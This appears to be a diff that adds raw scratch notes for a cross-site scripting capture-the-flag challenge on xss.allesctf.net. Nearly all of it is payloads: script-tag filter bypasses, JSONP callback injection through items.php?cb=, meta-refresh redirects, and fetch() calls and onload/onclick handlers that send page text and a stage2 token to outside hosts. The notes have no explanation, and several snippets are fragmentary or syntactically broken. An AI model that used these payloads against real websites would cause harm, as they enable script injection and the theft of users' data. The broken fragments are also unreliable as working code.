@@ -1,0 +1,173 @@
+document.getElementById("stage2").getAttribute("href");
+
+<script <script>> alert(1)<</script>/script>      /script>
+http://xss.allesctf.net/?search=%3C%00script+%3Cscript%00%3E%00%3E+alert(1)%3C%3C%2Fscript%3E%2Fscript%3E     "<script > alert(1)</script>" 
+
+http://xss.allesctf.net/items.php?cb=p         p([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schÃ¶n."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
+
+<script>alert(1)</script>
+
+http://xss.allesctf.net/items.php?cb=Text      Text([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schÃ¶n."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
+
+
+Text([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schÃ¶n."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
+
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://xss.allesctf.net/items.php?cb=alert(1)"></script>
+
+document.getElementById("stage2").getAttribute("href");
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://xss.allesctf.net/items.php?cb=alert(document.getElementById('stage2').getAttribute('href'))"></script>
+
+
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><image%20name=a%20src="https://google.de"></image><script%20src="http://xss.allesctf.net/items.php?cb=document.getElementsByName(%27a%27).src=%27http://benedikt-schwering.de/xss/index.php?chef=%27+document.getElementById(%27stage2%27).getAttribute(%27href%27)';//"></script>
+
+
+
+
+
+var client = new HttpClient();
+client.get('http://some/thing?with=arguments', function(response) {
+    // do something with response
+});
+
+
+
+var client = new HttpClient();client.get(document.getElementById('stage2').getAttribute('href'),function(response) {response});)
+
+
+const img = document.createElement('img');img.src=
+
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://xss.allesctf.net/items.php?cb="></script>
+
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://xss.allesctf.net/items.php?cb=var client = new HttpClient();client.get('http://benedikt-schwering.de/xss/index.php?chef='+document.getElementById('stage2').getAttribute('href'))"></script>
+
+
+xss.allesctf.net/?search=<meta http-equiv="refresh" content="0; url=http://benedikt-schwering.de/">
+
+
+fetch(window.location.href, {
+        headers: {'Content-type': 'application/x-www-form-urlencoded'},
+        method: "POST",
+        credentials: "include",
+        body: 'bg=' + $(e.target).val() 
+    })
+    
+asdf=fetch(linksbums,{credentials: "include"})
+
+
+respone=fetch(document.getElementById('stage2').getAttribute('href'),{ method: 'GET',credentials: 'same-origin',mode: 'cors'});
+response.
+
+
+
+<iframe src=document.getElementById('stage2').getAttribute('href')></iframe>
+
+
+http://stage2.xss.allesctf.net/static/js/jquery-3.2.1.min.js
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://stage2.xss.allesctf.net/static/js/jquery-3.2.1.min.js"></script><script%20src="http://stage2.xss.allesctf.net/static/js/background.js"></script><script%20src="http://xss.allesctf.net/items.php?cb=document.getElementById('stage2').getAttribute('href');//"></script>
+
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://stage2.xss.allesctf.net/static/js/jquery-3.2.1.min.js"></script><script%20src="http://stage2.xss.allesctf.net/static/js/background.js"></script><script%20src="http://xss.allesctf.net/items.php?cb=document.getElementById('stage2').getAttribute('href');//"></script>
+
+
+<input type="hidden" id="bg" value="pommes">
+
+            <script>
+                var backgrounds = {
+                    'pommes': [
+                        '<img class="bg-img" src="/static/img/red.png" onload="fetch("benedikt-schwering.de/xss/index.php?chef=".concat($(".text-center")[0].innerText),{ method: "GET",credentials: "same-origin",mode: "no-cors"});"></img>'
+                    ]
+                }
+            </script>
+            
+            <button class="dropdown-item bg-btn" type="button" value="pommes">Pommes</button>
+            
+            
+
+$(".text-center")[0].innerText
+
+fetch("benedikt-schwering.de/xss/index.php?chef=".concat($(".text-center")[0].innerText),{ method: 'GET',credentials: 'same-origin',mode: 'no-cors'});
+
+
+
+
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://stage2.xss.allesctf.net/static/js/jquery-3.2.1.min.js"></script><script%20src="http://stage2.xss.allesctf.net/static/js/background.js"></script><script%20src="http://xss.allesctf.net/items.php?cb=document.getElementById('stage2').getAttribute('href');//"></script><script%20src="http://xss.allesctf.net/items.php?cb=var backgrounds={'pommes':['<img class=\"bg-img\" src=\"/static/img/red.png\" onload=\"fetch(\"benedikt-schwering.de/xss/index.php?chef=\".concat($(\".text-center\")[0].innerText),{ method: \"GET",credentials: \"same-origin\",mode: \"no-cors\"});\"></img>']}\"></script>
+
+
+
+http://xss.allesctf.net/?search=</b></div></div></div></div><script%20src="http://stage2.xss.allesctf.net/static/js/jquery-3.2.1.min.js"></script><script%20src="http://stage2.xss.allesctf.net/static/js/background.js"></script><script%20src="http://xss.allesctf.net/items.php?cb=document.getElementById('stage2').getAttribute('href');//"></script><script"20src="http://xss.allesctf.net/items.php?cb=var backgrounds={'pommes':['<img class="bg-img" src="/static/img/red.png" onload="fetch("benedikt-schwering.de/xss/index.php?chef=".concat($(".text-center")[0].innerText),{ method: "GET",credentials: "same-origin",mode: "no-cors"});"></img>']}"></script>
+
+
+
+
+
+
+http://benedikt-schwering.de/xss/script.js
+
+
+
+bg=red"><meta http-equiv="refresh" content="0; url=http://benedikt-schwering.de/xss/index.php?chef=">
+
+bg=red"><meta http-equiv="refresh" content="0; url=http://b2f.bplaced.net/x/index.php?g=">
+
+
+<script src="http://xss.allesctf.net/items.php?></script>
+
+
+
+
+bg=red"><script>
+function win(){fetch("http://b2f.bplaced.net/x/g.php?g=".concat($(".text-center")[0].innerText));}
+</script>
+
+fetch("http://b2f.bplaced.net/x/g.php?g=".concat("Flag"))
+
+function win(){fetch("http://b2f.bplaced.net/x/g.php?g=".concat($(".text-center")[0].innerText));}
+
+
+
+<script>
+window.addEventListener("message", receiveMessage, false);
+
+function receiveMessage(event) {
+  fetch("http://b2f.bplaced.net/x/g.php?g=".concat($(".text-center")[0].innerText));
+}
+</script>
+
+
+"'<iframe src='.concat(document.getElementById('stage2').getAttribute('href')).concat('></iframe>')"
+
+
+<iframe src=""></iframe>
+
+<iframe src="http://stage2.xss.allesctf.net/?token=5e7272330232b"></iframe>
+
+<script>
+const parent = document.querySelector('#deck');
+var l=document.getElementById('stage2').getAttribute('href');
+
+const ifr=document.createElement('iframe');
+ifr.src=l;
+
+fetch(l, {
+        headers: {'Content-type': 'application/x-www-form-urlencoded'},
+        method: "POST",
+        credentials: "include",
+        body: 'bg=red"><script>window.addEventListener("message", receiveMessage, false);function receiveMessage(event) {fetch("http://b2f.bplaced.net/x/g.php?g=".concat($(".text-center")[0].innerText));}</script>'
+    }
+parent.appendChild(ifr);
+ifr.a
+</script>
+
+
+<button class="dropdown-item bg-btn" type="button" value="tree" onclick="fetch('http://b2f.bplaced.net/x/g.php?g='.concat($('.text-center')[0].innerText));">Baum</button>
+
+<button class="dropdown-item bg-btn" type="button" value="tree" onclick="alert(1);">Baum</button>
+
+
